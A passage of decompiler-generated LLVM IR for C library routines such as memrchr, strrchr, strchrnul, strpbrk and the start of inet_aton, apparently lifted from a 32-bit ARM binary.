  br i1 %v9_1724c, label %dec_label_pc_1728c, label %dec_label_pc_17258

dec_label_pc_17258:                               ; preds = %dec_label_pc_17244
  %v1_17258 = add i32 %v0_17260, 1
  %v2_17258 = inttoptr i32 %v1_17258 to i8*
  %v3_17258 = load i8, i8* %v2_17258, align 1
  %v4_17258 = zext i8 %v3_17258 to i32
  %v9_1725c = icmp eq i32 %v4_17258, %v1_171f0
  br i1 %v9_1725c, label %bb, label %dec_label_pc_1726c

bb:                                               ; preds = %dec_label_pc_17258
  br label %dec_label_pc_1728c

dec_label_pc_1726c:                               ; preds = %dec_label_pc_17258
  %v1_1726c = add i32 %v0_17260, 2
  %v2_1726c = inttoptr i32 %v1_1726c to i8*
  %v3_1726c = load i8, i8* %v2_1726c, align 1
  %v4_1726c = zext i8 %v3_1726c to i32
  %v9_17270 = icmp eq i32 %v4_1726c, %v1_171f0
  br i1 %v9_17270, label %dec_label_pc_1728c, label %dec_label_pc_1727c

dec_label_pc_1727c:                               ; preds = %dec_label_pc_1726c
  %v2_1727c = inttoptr i32 %v1_17250 to i8*
  %v3_1727c = load i8, i8* %v2_1727c, align 1
  %v4_1727c = zext i8 %v3_1727c to i32
  %v9_17280 = icmp eq i32 %v4_1727c, %v1_171f0
  br i1 %v9_17280, label %dec_label_pc_17288, label %dec_label_pc_1721c

dec_label_pc_17288:                               ; preds = %dec_label_pc_1727c
  br label %dec_label_pc_1728c

dec_label_pc_1728c:                               ; preds = %dec_label_pc_171f8, %dec_label_pc_1726c, %dec_label_pc_17244, %bb, %dec_label_pc_17288
  %v1_17290 = phi i32 [ %v1_17250, %dec_label_pc_17288 ], [ %v1_17258, %bb ], [ %v1_1726c, %dec_label_pc_1726c ], [ %v0_17260, %dec_label_pc_17244 ], [ %v0_17204, %dec_label_pc_171f8 ]
  ret i32 %v1_17290

; uselistorder directives
  uselistorder i32 %v4_1721c, { 1, 0 }
  uselistorder i32 %v0_17260, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_17210, { 1, 0 }
  uselistorder i32 %v1_17204, { 1, 0, 2 }
  uselistorder i32 %v0_172082, { 2, 1, 0 }
  uselistorder i32 %v1_171f0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1728c, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_171f8, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_172a0 = urem i32 %arg2, 256
  %v2_172a4 = add i32 %arg3, %arg1
  %v2_172bc4 = icmp eq i32 %arg3, 0
  br i1 %v2_172bc4, label %dec_label_pc_172cc, label %dec_label_pc_172c4

dec_label_pc_172ac:                               ; preds = %dec_label_pc_172c4
  %v1_172ac = add i32 %v0_172ac, -1
  %v2_172ac = inttoptr i32 %v1_172ac to i8*
  %v3_172ac = load i8, i8* %v2_172ac, align 1
  %v4_172ac = zext i8 %v3_172ac to i32
  %v9_172b0 = icmp eq i32 %v4_172ac, %v1_172a0
  br i1 %v9_172b0, label %dec_label_pc_1736c, label %dec_label_pc_172b8

dec_label_pc_172b8:                               ; preds = %dec_label_pc_172ac
  %v1_172b8 = add i32 %v0_172b8, -1
  %v2_172bc = icmp eq i32 %v1_172b8, 0
  br i1 %v2_172bc, label %dec_label_pc_172cc, label %dec_label_pc_172c4

dec_label_pc_172c4:                               ; preds = %entry, %dec_label_pc_172b8
  %v0_172b8 = phi i32 [ %v1_172b8, %dec_label_pc_172b8 ], [ %arg3, %entry ]
  %v0_172ac = phi i32 [ %v1_172ac, %dec_label_pc_172b8 ], [ %v2_172a4, %entry ]
  %v1_172c4 = urem i32 %v0_172ac, 4
  %v2_172c4 = icmp eq i32 %v1_172c4, 0
  br i1 %v2_172c4, label %dec_label_pc_172cc, label %dec_label_pc_172ac

dec_label_pc_172cc:                               ; preds = %dec_label_pc_172b8, %dec_label_pc_172c4, %entry
  %v0_1735413 = phi i32 [ %v2_172a4, %entry ], [ %v1_172ac, %dec_label_pc_172b8 ], [ %v0_172ac, %dec_label_pc_172c4 ]
  %v0_173409 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_172b8 ], [ %v0_172b8, %dec_label_pc_172c4 ]
  %v4_172cc = mul nuw nsw i32 %v1_172a0, 256
  %v5_172cc = or i32 %v4_172cc, %v1_172a0
  %v4_172d0 = mul i32 %v5_172cc, 65536
  %v5_172d0 = or i32 %v4_172d0, %v5_172cc
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_173409, 3
  br i1 %tmp, label %dec_label_pc_172d8, label %dec_label_pc_17360

dec_label_pc_172d8:                               ; preds = %dec_label_pc_172cc, %dec_label_pc_17340.backedge
  %v0_172f440 = phi i32 [ %v1_172f4, %dec_label_pc_17340.backedge ], [ %v0_173409, %dec_label_pc_172cc ]
  %v0_172d839 = phi i32 [ %v1_172d8, %dec_label_pc_17340.backedge ], [ %v0_1735413, %dec_label_pc_172cc ]
  %v1_172d8 = add i32 %v0_172d839, -4
  %v2_172d8 = inttoptr i32 %v1_172d8 to i32*
  %v3_172d8 = load i32, i32* %v2_172d8, align 4
  %v2_172dc = xor i32 %v3_172d8, %v5_172d0
  %v2_172e0 = add i32 %v2_172dc, 2130640639
  store i32 %v2_172e0, i32* @ip, align 4
  %v1_172e4 = sub i32 -1, %v2_172dc
  %v2_172e8 = xor i32 %v2_172e0, %v1_172e4
  %v2_172ec = and i32 %v2_172e8, -2130640640
  %v2_172f0 = icmp eq i32 %v2_172ec, 0
  %v1_172f4 = add i32 %v0_172f440, -4
  br i1 %v2_172f0, label %dec_label_pc_17340.backedge, label %dec_label_pc_172fc

dec_label_pc_17340.backedge:                      ; preds = %dec_label_pc_172d8, %dec_label_pc_17334
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_172f4, 3
  br i1 %tmp46, label %dec_label_pc_172d8, label %dec_label_pc_17360

dec_label_pc_172fc:                               ; preds = %dec_label_pc_172d8
  %v1_172fc = add i32 %v0_172d839, -1
  %v2_172fc = inttoptr i32 %v1_172fc to i8*
  %v3_172fc = load i8, i8* %v2_172fc, align 1
  %v4_172fc = zext i8 %v3_172fc to i32
  %v9_17300 = icmp eq i32 %v4_172fc, %v1_172a0
  br i1 %v9_17300, label %dec_label_pc_1732c, label %dec_label_pc_1730c

dec_label_pc_1730c:                               ; preds = %dec_label_pc_172fc
  %v1_1730c = add i32 %v0_172d839, -2
  %v2_1730c = inttoptr i32 %v1_1730c to i8*
  %v3_1730c = load i8, i8* %v2_1730c, align 1
  %v4_1730c = zext i8 %v3_1730c to i32
  %v9_17310 = icmp eq i32 %v4_1730c, %v1_172a0
  br i1 %v9_17310, label %dec_label_pc_1732c, label %dec_label_pc_1731c

dec_label_pc_1731c:                               ; preds = %dec_label_pc_1730c
  %v1_1731c = add i32 %v0_172d839, -3
  %v2_1731c = inttoptr i32 %v1_1731c to i8*
  %v3_1731c = load i8, i8* %v2_1731c, align 1
  %v4_1731c = zext i8 %v3_1731c to i32
  %v9_17320 = icmp eq i32 %v4_1731c, %v1_172a0
  br i1 %v9_17320, label %dec_label_pc_1732c, label %dec_label_pc_17334

dec_label_pc_1732c:                               ; preds = %dec_label_pc_1731c, %dec_label_pc_1730c, %dec_label_pc_172fc
  %v0_1732c = phi i32 [ %v1_1731c, %dec_label_pc_1731c ], [ %v1_1730c, %dec_label_pc_1730c ], [ %v1_172fc, %dec_label_pc_172fc ]
  br label %dec_label_pc_1736c

dec_label_pc_17334:                               ; preds = %dec_label_pc_1731c
  %v1_17334 = inttoptr i32 %v1_172d8 to i8*
  %v2_17334 = load i8, i8* %v1_17334, align 1
  %v3_17334 = zext i8 %v2_17334 to i32
  %v9_17338 = icmp eq i32 %v3_17334, %v1_172a0
  br i1 %v9_17338, label %dec_label_pc_1736c, label %dec_label_pc_17340.backedge

dec_label_pc_17354:                               ; preds = %dec_label_pc_17360
  %v1_17360 = add i32 %v0_17360, -1
  %v1_17354 = add i32 %v0_17354, -1
  %v2_17354 = inttoptr i32 %v1_17354 to i8*
  %v3_17354 = load i8, i8* %v2_17354, align 1
  %v4_17354 = zext i8 %v3_17354 to i32
  %v9_17358 = icmp eq i32 %v4_17354, %v1_172a0
  br i1 %v9_17358, label %dec_label_pc_1736c, label %dec_label_pc_17360

dec_label_pc_17360:                               ; preds = %dec_label_pc_172cc, %dec_label_pc_17340.backedge, %dec_label_pc_17354
  %v0_17354 = phi i32 [ %v1_17354, %dec_label_pc_17354 ], [ %v0_1735413, %dec_label_pc_172cc ], [ %v1_172d8, %dec_label_pc_17340.backedge ]
  %v0_17360 = phi i32 [ %v1_17360, %dec_label_pc_17354 ], [ %v0_173409, %dec_label_pc_172cc ], [ %v1_172f4, %dec_label_pc_17340.backedge ]
  %v2_17360 = icmp eq i32 %v0_17360, 0
  br i1 %v2_17360, label %dec_label_pc_17368, label %dec_label_pc_17354

dec_label_pc_17368:                               ; preds = %dec_label_pc_17360
  br label %dec_label_pc_1736c

dec_label_pc_1736c:                               ; preds = %dec_label_pc_172ac, %dec_label_pc_17334, %dec_label_pc_17354, %dec_label_pc_1732c, %dec_label_pc_17368
  %v1_17370 = phi i32 [ %v0_1732c, %dec_label_pc_1732c ], [ 0, %dec_label_pc_17368 ], [ %v1_17354, %dec_label_pc_17354 ], [ %v1_172d8, %dec_label_pc_17334 ], [ %v1_172ac, %dec_label_pc_172ac ]
  ret i32 %v1_17370

; uselistorder directives
  uselistorder i32 %v0_17360, { 1, 0 }
  uselistorder i32 %v1_172f4, { 1, 0, 2 }
  uselistorder i32 %v1_172d8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_172d839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_172cc, { 1, 0 }
  uselistorder i32 %v0_173409, { 1, 2, 0 }
  uselistorder i32 %v0_172ac, { 1, 0, 2 }
  uselistorder i32 %v2_172a4, { 1, 0 }
  uselistorder i32 %v1_172a0, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1736c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17360, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17340.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_172d8, { 1, 0 }
  uselistorder label %dec_label_pc_172cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_172c4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_173ac2 = load i32, i32* @r0, align 4
  %v1_173ac3 = inttoptr i32 %v0_173ac2 to i8*
  %v2_173ac4 = load i8, i8* %v1_173ac3, align 1
  %v3_173ac5 = zext i8 %v2_173ac4 to i32
  store i32 %v3_173ac5, i32* @ip, align 4
  %v2_173b06 = icmp eq i8 %v2_173ac4, 0
  br i1 %v2_173b06, label %dec_label_pc_173bc, label %dec_label_pc_17390.preheader

dec_label_pc_17388:                               ; preds = %dec_label_pc_17390
  %v3_17390 = zext i8 %v2_17390 to i32
  %v1_17398 = add i32 %v0_17398, 1
  %v9_17388 = icmp eq i32 %v0_1738810, %v3_17390
  br i1 %v9_17388, label %dec_label_pc_173a4, label %dec_label_pc_17390

dec_label_pc_17390:                               ; preds = %dec_label_pc_17390.preheader, %dec_label_pc_17388
  %v0_17398 = phi i32 [ %tmp, %dec_label_pc_17390.preheader ], [ %v1_17398, %dec_label_pc_17388 ]
  %v1_17390 = inttoptr i32 %v0_17398 to i8*
  %v2_17390 = load i8, i8* %v1_17390, align 1
  %v2_17394 = icmp eq i8 %v2_17390, 0
  br i1 %v2_17394, label %dec_label_pc_173bc, label %dec_label_pc_17388

dec_label_pc_173a4:                               ; preds = %dec_label_pc_17388
  %v1_173a4 = add i32 %v0_173a4, 1
  %v1_173a8 = add i32 %v0_173a8, 1
  %v1_173ac = inttoptr i32 %v1_173a8 to i8*
  %v2_173ac = load i8, i8* %v1_173ac, align 1
  %v3_173ac = zext i8 %v2_173ac to i32
  store i32 %v3_173ac, i32* @ip, align 4
  %v2_173b0 = icmp eq i8 %v2_173ac, 0
  br i1 %v2_173b0, label %dec_label_pc_173bc, label %dec_label_pc_17390.preheader

dec_label_pc_17390.preheader:                     ; preds = %entry, %dec_label_pc_173a4
  %v0_173a8 = phi i32 [ %v1_173a8, %dec_label_pc_173a4 ], [ %v0_173ac2, %entry ]
  %v0_173a4 = phi i32 [ %v1_173a4, %dec_label_pc_173a4 ], [ 0, %entry ]
  %v0_1738810 = phi i32 [ %v3_173ac, %dec_label_pc_173a4 ], [ %v3_173ac5, %entry ]
  br label %dec_label_pc_17390

dec_label_pc_173bc:                               ; preds = %dec_label_pc_173a4, %dec_label_pc_17390, %entry
  %v0_173bc = phi i32 [ 0, %entry ], [ %v0_173a4, %dec_label_pc_17390 ], [ %v1_173a4, %dec_label_pc_173a4 ]
  ret i32 %v0_173bc

; uselistorder directives
  uselistorder i32 %v0_17398, { 1, 0 }
  uselistorder label %dec_label_pc_17390.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_173cc = urem i32 %arg2, 256
  store i32 %v1_173cc, i32* @r4, align 4
  %v2_173cc = icmp eq i32 %v1_173cc, 0
  br i1 %v2_173cc, label %dec_label_pc_173e0, label %dec_label_pc_173f4.preheader

dec_label_pc_173f4.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_173fc3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_173cc)
  %v2_174005 = icmp eq i32 %v2_173fc3, 0
  br i1 %v2_174005, label %dec_label_pc_17408, label %dec_label_pc_173ec

dec_label_pc_173e0:                               ; preds = %entry
  %v2_173e4 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1740c

dec_label_pc_173ec:                               ; preds = %dec_label_pc_173f4.preheader, %dec_label_pc_173ec
  %v2_173fc6 = phi i32 [ %v2_173fc, %dec_label_pc_173ec ], [ %v2_173fc3, %dec_label_pc_173f4.preheader ]
  store i32 %v2_173fc6, i32* @r5, align 4
  %v1_173f0 = add i32 %v2_173fc6, 1
  store i32 %v1_173f0, i32* @r0, align 4
  %v0_173f8 = load i32, i32* @r4, align 4
  %v2_173fc = call i32 @__GI_strchr(i32 %v1_173f0, i32 %v0_173f8)
  %v2_17400 = icmp eq i32 %v2_173fc, 0
  br i1 %v2_17400, label %dec_label_pc_17408, label %dec_label_pc_173ec

dec_label_pc_17408:                               ; preds = %dec_label_pc_173ec, %dec_label_pc_173f4.preheader
  %v0_17408 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1740c

dec_label_pc_1740c:                               ; preds = %dec_label_pc_173e0, %dec_label_pc_17408
  %storemerge = phi i32 [ %v2_173e4, %dec_label_pc_173e0 ], [ %v0_17408, %dec_label_pc_17408 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_173fc, { 1, 0 }
  uselistorder i32 %v1_173f0, { 1, 0 }
  uselistorder i32 %v1_173cc, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1740c, { 1, 0 }
  uselistorder label %dec_label_pc_173ec, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_17418 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17428 = call i32 @memcpy()
  %v0_1742c = load i32, i32* @r5, align 4
  %v1_1742c = load i32, i32* @r4, align 4
  %v2_1742c = add i32 %v1_1742c, %v0_1742c
  store i32 %v6_17418, i32* @r5, align 4
  ret i32 %v2_1742c
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_17440 = urem i32 %arg1, 256
  %v0_174602 = load i32, i32* @r0, align 4
  %v1_174603 = urem i32 %v0_174602, 4
  %v2_174604 = icmp eq i32 %v1_174603, 0
  br i1 %v2_174604, label %dec_label_pc_17468, label %dec_label_pc_17448

dec_label_pc_17448:                               ; preds = %entry, %dec_label_pc_1745c
  %v0_1745c = phi i32 [ %v1_1745c, %dec_label_pc_1745c ], [ %v0_174602, %entry ]
  %v1_17448 = inttoptr i32 %v0_1745c to i8*
  %v2_17448 = load i8, i8* %v1_17448, align 1
  %v3_17448 = zext i8 %v2_17448 to i32
  %v9_1744c = icmp eq i32 %v3_17448, %v1_17440
  br i1 %v9_1744c, label %dec_label_pc_17518, label %dec_label_pc_17454

dec_label_pc_17454:                               ; preds = %dec_label_pc_17448
  %v2_17454 = icmp eq i8 %v2_17448, 0
  br i1 %v2_17454, label %dec_label_pc_17518, label %dec_label_pc_1745c

dec_label_pc_1745c:                               ; preds = %dec_label_pc_17454
  %v1_1745c = add i32 %v0_1745c, 1
  %v1_17460 = urem i32 %v1_1745c, 4
  %v2_17460 = icmp eq i32 %v1_17460, 0
  br i1 %v2_17460, label %dec_label_pc_17468, label %dec_label_pc_17448

dec_label_pc_17468:                               ; preds = %dec_label_pc_1745c, %entry
  %v0_1746c = phi i32 [ %v0_174602, %entry ], [ %v1_1745c, %dec_label_pc_1745c ]
  %v4_17468 = mul nuw nsw i32 %v1_17440, 256
  %v5_17468 = or i32 %v4_17468, %v1_17440
  %v4_17470 = mul i32 %v5_17468, 65536
  %v5_17470 = or i32 %v4_17470, %v5_17468
  br label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %dec_label_pc_17510, %dec_label_pc_174b0, %dec_label_pc_17468
  %v0_174d8 = phi i32 [ %v0_1746c, %dec_label_pc_17468 ], [ %v4_17474, %dec_label_pc_174b0 ], [ %v4_17474, %dec_label_pc_17510 ]
  %v1_17474 = inttoptr i32 %v0_174d8 to i32*
  %v2_17474 = load i32, i32* %v1_17474, align 4
  %v4_17474 = add i32 %v0_174d8, 4
  %v2_1747c = xor i32 %v2_17474, %v5_17470
  %v2_17480 = add i32 %v2_1747c, 2130640639
  store i32 %v2_17480, i32* @ip, align 4
  %v2_17488 = add i32 %v2_17474, 2130640639
  %v1_1748c = sub i32 -1, %v2_17474
  %v2_17490 = xor i32 %v2_17488, %v1_1748c
  %v2_1749c = and i32 %v2_17490, -2130640640
  %v2_174a4 = icmp eq i32 %v2_1749c, 0
  br i1 %v2_174a4, label %dec_label_pc_174b0, label %dec_label_pc_174b8

dec_label_pc_174b0:                               ; preds = %dec_label_pc_17474
  %v1_17498 = sub i32 -1, %v2_1747c
  %v2_174a0 = xor i32 %v2_17480, %v1_17498
  %v2_174a8 = and i32 %v2_174a0, -2130640640
  %v2_174b0 = icmp eq i32 %v2_174a8, 0
  br i1 %v2_174b0, label %dec_label_pc_17474, label %dec_label_pc_174b8

dec_label_pc_174b8:                               ; preds = %dec_label_pc_17474, %dec_label_pc_174b0
  %v2_174b8 = inttoptr i32 %v0_174d8 to i8*
  %v3_174b8 = load i8, i8* %v2_174b8, align 1
  %v4_174b8 = zext i8 %v3_174b8 to i32
  %v9_174bc = icmp eq i32 %v4_174b8, %v1_17440
  br i1 %v9_174bc, label %dec_label_pc_17518, label %dec_label_pc_174c8

dec_label_pc_174c8:                               ; preds = %dec_label_pc_174b8
  %v2_174c8 = icmp eq i8 %v3_174b8, 0
  br i1 %v2_174c8, label %dec_label_pc_17518, label %dec_label_pc_174d0

dec_label_pc_174d0:                               ; preds = %dec_label_pc_174c8
  %v1_174d0 = add i32 %v0_174d8, 1
  %v2_174d0 = inttoptr i32 %v1_174d0 to i8*
  %v3_174d0 = load i8, i8* %v2_174d0, align 1
  %v4_174d0 = zext i8 %v3_174d0 to i32
  %v9_174d4 = icmp eq i32 %v4_174d0, %v1_17440
  br i1 %v9_174d4, label %dec_label_pc_17518, label %dec_label_pc_174e0

dec_label_pc_174e0:                               ; preds = %dec_label_pc_174d0
  %v2_174e0 = icmp eq i8 %v3_174d0, 0
  br i1 %v2_174e0, label %dec_label_pc_17518, label %dec_label_pc_174e8

dec_label_pc_174e8:                               ; preds = %dec_label_pc_174e0
  %v1_174e8 = add i32 %v0_174d8, 2
  %v2_174e8 = inttoptr i32 %v1_174e8 to i8*
  %v3_174e8 = load i8, i8* %v2_174e8, align 1
  %v4_174e8 = zext i8 %v3_174e8 to i32
  %v9_174ec = icmp eq i32 %v4_174e8, %v1_17440
  br i1 %v9_174ec, label %dec_label_pc_17518, label %dec_label_pc_174f8

dec_label_pc_174f8:                               ; preds = %dec_label_pc_174e8
  %v2_174f8 = icmp eq i8 %v3_174e8, 0
  br i1 %v2_174f8, label %dec_label_pc_17518, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174f8
  %v1_17500 = add i32 %v0_174d8, 3
  %v2_17500 = inttoptr i32 %v1_17500 to i8*
  %v3_17500 = load i8, i8* %v2_17500, align 1
  %v4_17500 = zext i8 %v3_17500 to i32
  %v9_17504 = icmp eq i32 %v4_17500, %v1_17440
  br i1 %v9_17504, label %dec_label_pc_17518, label %dec_label_pc_17510

dec_label_pc_17510:                               ; preds = %dec_label_pc_17500
  %v2_17510 = icmp eq i8 %v3_17500, 0
  br i1 %v2_17510, label %dec_label_pc_17518, label %dec_label_pc_17474

dec_label_pc_17518:                               ; preds = %dec_label_pc_17454, %dec_label_pc_17448, %dec_label_pc_17510, %dec_label_pc_17500, %dec_label_pc_174f8, %dec_label_pc_174e8, %dec_label_pc_174e0, %dec_label_pc_174d0, %dec_label_pc_174c8, %dec_label_pc_174b8
  %v1_1751c = phi i32 [ %v1_17500, %dec_label_pc_17510 ], [ %v1_17500, %dec_label_pc_17500 ], [ %v1_174e8, %dec_label_pc_174f8 ], [ %v1_174e8, %dec_label_pc_174e8 ], [ %v1_174d0, %dec_label_pc_174e0 ], [ %v1_174d0, %dec_label_pc_174d0 ], [ %v0_174d8, %dec_label_pc_174c8 ], [ %v0_174d8, %dec_label_pc_174b8 ], [ %v0_1745c, %dec_label_pc_17448 ], [ %v0_1745c, %dec_label_pc_17454 ]
  ret i32 %v1_1751c

; uselistorder directives
  uselistorder i32 %v4_17474, { 1, 0 }
  uselistorder i32 %v2_17474, { 0, 2, 1 }
  uselistorder i32 %v0_174d8, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_17468, { 1, 0 }
  uselistorder i32 %v1_1745c, { 1, 0, 2 }
  uselistorder i32 %v0_174602, { 2, 1, 0 }
  uselistorder i32 %v1_17440, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_17518, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_174b8, { 1, 0 }
  uselistorder label %dec_label_pc_17448, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17554

dec_label_pc_17530:                               ; preds = %dec_label_pc_17540
  %v3_17540 = zext i8 %v2_17540 to i32
  %v1_17548 = add i32 %v0_17548, 1
  %v1_17530 = load i32, i32* %r0.global-to-local, align 4
  %v9_17530 = icmp eq i32 %v3_17540, %v1_17530
  br i1 %v9_17530, label %dec_label_pc_17538, label %dec_label_pc_17540

dec_label_pc_17538:                               ; preds = %dec_label_pc_17530
  %v0_17538 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17538, i32* %r0.global-to-local, align 4
  ret i32 %v0_17538

dec_label_pc_17540:                               ; preds = %dec_label_pc_17530, %dec_label_pc_17554
  %v0_17548 = phi i32 [ %v1_17548, %dec_label_pc_17530 ], [ %arg2, %dec_label_pc_17554 ]
  %v1_17540 = inttoptr i32 %v0_17548 to i8*
  %v2_17540 = load i8, i8* %v1_17540, align 1
  %v2_17544 = icmp eq i8 %v2_17540, 0
  br i1 %v2_17544, label %dec_label_pc_17550, label %dec_label_pc_17530

dec_label_pc_17550:                               ; preds = %dec_label_pc_17540
  %v0_17550 = load i32, i32* %r2.global-to-local, align 4
  %v1_17550 = add i32 %v0_17550, 1
  br label %dec_label_pc_17554

dec_label_pc_17554:                               ; preds = %entry, %dec_label_pc_17550
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_17550, %dec_label_pc_17550 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_17554 = inttoptr i32 %storemerge to i8*
  %v2_17554 = load i8, i8* %v1_17554, align 1
  %v3_17554 = zext i8 %v2_17554 to i32
  store i32 %v3_17554, i32* %r0.global-to-local, align 4
  %v2_17558 = icmp eq i8 %v2_17554, 0
  %v0_1755c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17558, i32 %v0_1755c)
  br label %dec_label_pc_17540

; uselistorder directives
  uselistorder i32 %v0_17548, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_17554, { 1, 0 }
  uselistorder label %dec_label_pc_17540, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17568 = load i32, i32* @r4, align 4
  store i32 %v3_17568, i32* %stack_var_-28, align 4
  %v0_17570 = load i32, i32* %r0.global-to-local, align 4
  %v2_17570 = icmp eq i32 %v0_17570, 0
  br i1 %v2_17570, label %dec_label_pc_1764c, label %dec_label_pc_17580

dec_label_pc_17580:                               ; preds = %entry
  br label %dec_label_pc_17598

dec_label_pc_17598:                               ; preds = %dec_label_pc_17580, %dec_label_pc_17610
  %v1_17610 = phi i32 [ 0, %dec_label_pc_17580 ], [ %v5_17610, %dec_label_pc_17610 ]
  %v0_17614 = phi i32 [ 1, %dec_label_pc_17580 ], [ %v1_17614, %dec_label_pc_17610 ]
  %v0_17598 = phi i32 [ %v0_17570, %dec_label_pc_17580 ], [ %v0_1759812, %dec_label_pc_17610 ]
  %v1_17598 = inttoptr i32 %v0_17598 to i8*
  %v2_17598 = load i8, i8* %v1_17598, align 1
  %v3_17598 = zext i8 %v2_17598 to i32
  %v4_1759c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 3528) to i32*), align 4
  %v2_175a0 = mul nuw nsw i32 %v3_17598, 2
  %v2_175a4 = add i32 %v2_175a0, %v4_1759c
  %v3_175a4 = inttoptr i32 %v2_175a4 to i16*
  %v4_175a4 = load i16, i16* %v3_175a4, align 2
  %v1_175a8 = and i16 %v4_175a4, 8
  %v2_175a8 = icmp eq i16 %v1_175a8, 0
  br i1 %v2_175a8, label %dec_label_pc_1764c, label %dec_label_pc_175b0

dec_label_pc_175b0:                               ; preds = %dec_label_pc_17598
  br label %dec_label_pc_175d0

dec_label_pc_175b8:                               ; preds = %dec_label_pc_175d0
  %v2_175b8 = mul i32 %v0_17610, 10
  %v1_175bc = add i32 %v2_175b8, -48
  %v2_175c0 = add i32 %v3_175d0, %v1_175bc
  %v8_175c8 = icmp sgt i32 %v2_175c0, 255
  br i1 %v8_175c8, label %dec_label_pc_1764c, label %dec_label_pc_175cc

dec_label_pc_175cc:                               ; preds = %dec_label_pc_175b8
  %v1_175cc = add i32 %v0_17600, 1
  store i32 %v1_175cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_175d0

dec_label_pc_175d0:                               ; preds = %dec_label_pc_175b0, %dec_label_pc_175cc
  %v0_17610 = phi i32 [ 0, %dec_label_pc_175b0 ], [ %v2_175c0, %dec_label_pc_175cc ]
  %v0_17600 = phi i32 [ %v0_17598, %dec_label_pc_175b0 ], [ %v1_175cc, %dec_label_pc_175cc ]
  %v1_175d0 = inttoptr i32 %v0_17600 to i8*
  %v2_175d0 = load i8, i8* %v1_175d0, align 1
  %v3_175d0 = zext i8 %v2_175d0 to i32
  %v2_175d4 = mul nuw nsw i32 %v3_175d0, 2
  %v2_175d8 = add i32 %v2_175d4, %v4_1759c
  %v3_175d8 = inttoptr i32 %v2_175d8 to i16*
  %v4_175d8 = load i16, i16* %v3_175d8, align 2
  %v6_175d8 = zext i16 %v4_175d8 to i32
  %v1_175dc = and i32 %v6_175d8, 8
  %v2_175dc = icmp eq i32 %v1_175dc, 0
  br i1 %v2_175dc, label %dec_label_pc_175e4, label %dec_label_pc_175b8

dec_label_pc_175e4:                               ; preds = %dec_label_pc_175d0
  %v7_175e4 = icmp eq i32 %v0_17614, 4
  br i1 %v7_175e4, label %dec_label_pc_175fc, label %dec_label_pc_175ec

dec_label_pc_175ec:                               ; preds = %dec_label_pc_175e4
  %v7_175ec = icmp eq i8 %v2_175d0, 46
  br i1 %v7_175ec, label %dec_label_pc_175f4, label %dec_label_pc_1764c

dec_label_pc_175f4:                               ; preds = %dec_label_pc_175ec
  %v1_175f4 = add i32 %v0_17600, 1
  store i32 %v1_175f4, i32* %r0.global-to-local, align 4
